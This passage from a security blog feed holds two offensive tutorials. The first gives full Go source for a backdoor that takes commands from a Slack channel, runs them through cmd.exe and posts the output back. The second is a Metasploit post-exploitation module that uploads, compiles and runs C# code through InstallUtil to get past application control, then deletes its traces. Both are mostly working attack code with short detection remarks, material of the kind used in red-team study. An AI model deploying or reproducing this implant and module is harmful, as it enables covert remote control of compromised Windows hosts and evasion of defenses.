class="line"></span><br></pre></td></tr></table></figure><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">utils <span class="string">&quot;slackc2/core&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/tidwall/gjson&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="literal">true</span> &#123;</span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">q := req.URL.Query()</span><br><span class="line">q.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">q.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">q.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">req.URL.RawQuery = q.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fmt.Println(url)</span></span><br><span class="line"><span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">json := <span class="type">string</span>(body)</span><br><span class="line"><span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">text := gjson.Get(json, <span class="string">&quot;messages.0.text&quot;</span>)</span><br><span class="line"><span class="comment">// fmt.Print(text)</span></span><br><span class="line">cmd := strings.Split(text.String(), <span class="string">&quot; &quot;</span>)</span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line"><span class="string">&quot;cmd&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line"><span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line"><span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line"><span class="keyword">if</span> cmdlist == <span class="string">&quot;cmd&quot;</span> &#123;</span><br><span class="line"><span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line"><span class="comment">// if runtime.GOOS == &quot;windows&quot; &#123;</span></span><br><span class="line">command := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd[<span class="number">1</span>])</span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">// command := exec.Command(cmd[1])</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">stdoutStderr, err := command.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">output := utils.ConvertByte2String(stdoutStderr, utils.GB18030)</span><br><span class="line">str := <span class="string">&quot;output-&quot;</span> + output</span><br><span class="line"><span class="comment">//以发送cmd输出的信息输出到output，并发送到频道</span></span><br><span class="line"><span class="comment">// postMessage URL用于将输出的结果发送到slack频道中</span></span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">p := req.URL.Query()</span><br><span class="line">p.Add(<span class="string">&quot;token&quot;</span>, utils.Token)</span><br><span class="line">p.Add(<span class="string">&quot;channel&quot;</span>, utils.Channel)</span><br><span class="line">p.Add(<span class="string">&quot;pretty&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.Add(<span class="string">&quot;text&quot;</span>, str)</span><br><span class="line">req.URL.RawQuery = p.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">postMessage := <span class="type">string</span>(body)</span><br><span class="line">OUTPUT := gjson.Get(postMessage, <span class="string">&quot;message.0&quot;</span>)</span><br><span class="line">log.Println(OUTPUT)</span><br><span class="line"><span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4'    frameborder="0"     allowfullscreen></iframe><h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h3><p>​    可以使用网络连接来关联未知或可疑过程活动的主机数据对于补充基于恶意软件命令和控制签名，基础结构或强加密的存在的任何现有危害指标至关重要。如果数据已加密，则数据包捕获分析将需要SSL&#x2F;TLS检查。分析网络数据中不常见的数据流（例如，客户端发送的数据比从服务器接收的数据多得多）。行为监视可能有助于检测异常活动模式 。</p><p><strong>参考链接：</strong></p><p> <a href="https://github.com/bkup/SlackShell">https://github.com/bkup/SlackShell</a> </p><p> <a href="https://blog.csdn.net/systemino/article/details/97636359">https://blog.csdn.net/systemino/article/details/97636359</a> </p><p> <a href="https://api.slack.com/methods/chat.postMessage">https://api.slack.com/methods/chat.postMessage</a> </p><p> <a href="https://api.slack.com/methods/conversations.history">https://api.slack.com/methods/conversations.history</a> </p><p> <a href="https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019">https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019</a> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/categories/ATT-CK/"/>
    
    <category term="C2" scheme="https://www.ggsec.cn/categories/C2/"/>
    
    
    <category term="windows" scheme="https://www.ggsec.cn/tags/windows/"/>
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/tags/ATT-CK/"/>
    
    <category term="C2" scheme="https://www.ggsec.cn/tags/C2/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit后渗透模块编写ATT&amp;CK-T1118</title>
    <link href="https://www.ggsec.cn/metasploit%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99ATT&amp;CK-T1118.html"/>
    <id>https://www.ggsec.cn/metasploit%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99ATT&amp;CK-T1118.html</id>
    <published>2020-08-19T12:47:34.000Z</published>
    <updated>2022-11-25T23:55:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg" alt="4"><span id="more"></span></p><h2 id="1-T1118"><a href="#1-T1118" class="headerlink" title="1.T1118"></a>1.T1118</h2><p>攻击者可以使用InstallUtil通过受信任的Windows实用工具代理代码执行。InstallUtil是一个命令行实用程序，通过执行.NET二进制文件中指定的特定安装程序组件，允许安装和卸载资源。（引用：MSDN InstallUtil）InstallUtil由Microsoft数字签名，位于Windows系统上的.NET目录中：<code>C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe``C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe</code></p><p>通过在二进制文件中使用执行用属性装饰的类的属性，InstallUtil也可以用于绕过应用程序控制<code>[System.ComponentModel.RunInstaller(true)]</code></p><h2 id="2-T1118-POC"><a href="#2-T1118-POC" class="headerlink" title="2.T1118-POC"></a>2.T1118-POC</h2><p> <strong>InstallUtil HelpText方法调用</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-4.png" alt="4"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步:</span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">csc.exe</span> /<span class="title">target:library</span> <span class="title">T1118.cs</span></span></span><br><span class="line"><span class="function">第二步:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /<span class="title">U</span> /<span class="title">logfile</span>= /<span class="title">logtoconsole</span>=<span class="title">false</span> <span class="title">T1118.dll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HelpText</span> 调用:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /? <span class="title">T1118.dll</span></span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-5.png" alt="5"></p><h2 id="3-开始编写模块"><a href="#3-开始编写模块" class="headerlink" title="3.开始编写模块"></a>3.开始编写模块</h2><p><strong>思路流程：</strong></p><p>由于t1118属于后渗透阶段，我们为其在获取session会话的时候进行以下操作</p><p><strong>1.上传源代码。</strong></p><p><strong>2.csc编译dll</strong></p><p><strong>3.InstallUtil.exe调用加载dll</strong> </p><p>需要定义设置的参数：</p><p><strong>1.本地C#源码</strong></p><p><strong>2.上传windows的路径</strong></p><p><strong>3.dotnet的版本</strong></p><p>我们在**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;<strong>和&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;文件夹中新建一个文件夹本文命名为</strong>secist**，在这个文件夹中用于存放关于att&amp;ck相关的攻击模块。</p><p><strong>然后新建一个ruby文件，为其命名为t1118.rb。</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-6.png" alt="6"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-8.png" alt="6"></p><h3 id="3-1-初始化模块"><a href="#3-1-初始化模块" class="headerlink" title="3.1 初始化模块"></a>3.1 初始化模块</h3><p>参考官方编写模块 <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module">https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module</a> </p><p><strong>定义初始化info信息</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-7.png" alt="7"></p><p>设置参数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptString</span>.new( <span class="string">&#x27;RFILE&#x27;</span>, [<span class="literal">false</span>, <span class="string">&#x27;上传到windows路径&#x27;</span>,<span class="string">&#x27;C:\\windows\\temp\\t1118.tmp&#x27;</span> ]),</span><br><span class="line"><span class="title class_">OptString</span>.new(<span class="string">&#x27;LFILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;本地t1118.cs路径&#x27;</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;secist&quot;</span>, <span class="string">&quot;t1118&quot;</span>, <span class="string">&quot;t1118.cs&quot;</span>) ]),</span><br><span class="line"><span class="title class_">OptBool</span>.new(<span class="string">&#x27;CLEANUP_FILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&quot;清理文件&quot;</span>, <span class="literal">true</span>]),</span><br><span class="line"><span class="title class_">OptString</span>.new(<span class="string">&#x27;DOTNET_VERSION&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;DotNet Version&#x27;</span>,<span class="string">&#x27;v4.0.30319&#x27;</span> ]),</span><br></pre></td></tr></table></figure><p>定义使用run命令 执行的内容。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">        print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">        print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">        print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-2-定义本地文件和上传文件"><a href="#3-2-定义本地文件和上传文件" class="headerlink" title="3.2  定义本地文件和上传文件"></a>3.2  定义本地文件和上传文件</h3><p><strong>定义remote_file和local_file 对 datastore[‘RFILE’]和 datastore[‘LFILE’]取值</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remote_file</span></span><br><span class="line">    <span class="keyword">if</span> datastore[<span class="string">&#x27;RFILE&#x27;</span>].blank?</span><br><span class="line">      remote_name = File.basename(datastore[<span class="string">&#x27;LFILE&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      remote_name = datastore[<span class="string">&#x27;RFILE&#x27;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    remote_name</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_file</span></span><br><span class="line">      datastore[<span class="string">&#x27;LFILE&#x27;</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-3-删除上传的源代码"><a href="#3-3-删除上传的源代码" class="headerlink" title="3.3 删除上传的源代码"></a>3.3 删除上传的源代码</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span></span><br><span class="line">      print_status(<span class="string">&quot;Removing files...&quot;</span>)</span><br><span class="line">      register_file_for_cleanup(datastore[<span class="string">&#x27;RFILE&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-3定义cmd的命令"><a href="#3-3定义cmd的命令" class="headerlink" title="3.3定义cmd的命令"></a>3.3定义cmd的命令</h3><p>使用run_cmd 运行命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">user_cmd,io=<span class="literal">true</span></span>)</span><br><span class="line">    cmd = <span class="string">&quot;cmd /c <span class="subst">#&#123;user_cmd&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      print_status(<span class="string">&quot;Executing &#x27;<span class="subst">#&#123;cmd&#125;</span>&#x27; on <span class="subst">#&#123;session.inspect&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span> io</span><br><span class="line">        res = cmd_exec(cmd)</span><br><span class="line">        <span class="keyword">if</span> res</span><br><span class="line">          print_warning(res)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">&#x27;Hidden&#x27;</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">      print_error(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="3-4上传文件和命令执行"><a href="#3-4上传文件和命令执行" class="headerlink" title="3.4上传文件和命令执行"></a>3.4上传文件和命令执行</h3><p>该步骤为以下内容</p><p>1.上传本地的**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;secist&#x2F;t1118&#x2F;t1118.cs<strong>文件到</strong>C:\windows\temp\t1118.tmp**</p><p><strong>2.使用csc.exe 对t1118.tmp 进行编译</strong></p><p><strong>3.使用InstallUtil对编译后的dll进行调用</strong></p><p><strong>4.删除源文件</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">&#x27;DOTNET_VERSION&#x27;</span>]</span><br><span class="line">            base = <span class="string">&#x27;C:\Windows\Microsoft.NET\Framework&#x27;</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;csc.exe&#x27;</span></span><br><span class="line">            installutil = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;installutil.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">&quot;Compiling...&quot;</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line"><span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library T1118.cs</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll&quot;)</span></span><br><span class="line">        <span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false T1118.dll    </span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            print_status(<span class="string">&quot;Executing InstallUtil...&quot;</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">&quot;清理缓存成功&quot;</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">            print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>t1118整体加载模块初始设置</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-1.png" alt="1"></p><p><strong>poc 运行后</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-2.png" alt="2"></p><p><strong>poc 填入shellcode 运行后</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-.png" alt="xj"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-xj.png" alt="xj"></p><p><strong>demo演示</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com//msft1118.gif" alt="msft1118"></p><h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><p><strong>添加库路径&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;post&#x2F;windows.rb</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core/post/windows/secist&#x27;</span></span><br></pre></td></tr></table></figure><p>定义库文件**&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;post&#x2F;windows&#x2F;secist.rb**</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: binary -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Msf</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Post</span></span><br><span class="line"><span class="keyword">module</span> Windows</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Secist</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remote_file</span></span><br><span class="line">      <span class="keyword">if</span> datastore[<span class="string">&#x27;RFILE&#x27;</span>].blank?</span><br><span class="line">        remote_name = File.basename(datastore[<span class="string">&#x27;LFILE&#x27;</span>])</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        remote_name = datastore[<span class="string">&#x27;RFILE&#x27;</span>]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">      remote_name</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#本地文件</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">local_file</span></span><br><span class="line">        datastore[<span class="string">&#x27;LFILE&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#清理文件</span></span><br><span class="line">  <span 